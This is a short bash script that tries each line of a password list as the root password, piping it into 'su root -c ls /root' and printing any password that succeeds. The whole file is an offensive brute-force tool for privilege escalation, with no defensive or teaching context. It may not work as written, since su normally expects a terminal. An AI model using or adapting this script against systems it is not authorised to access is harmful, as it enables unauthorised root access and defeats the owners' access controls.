#!/bin/bash

password_file="password_list.txt"

if [ ! -f "$password_file" ]; then
    echo "File $password_file not found."
    exit 1
fi

total_passwords=$(wc -l < "$password_file")
attempt=0

while IFS= read -r password; do
    attempt=$((attempt + 1))
    echo "[$attempt/$total_passwords] Try with: $password ..."
    if echo "$password" | su root -c 'ls /root' > /dev/null 2>&1; then
        echo "Do it! Root password is: $password"
        exit 0
    fi

done < "$password_file"

echo "END. Password not found"
exit 1
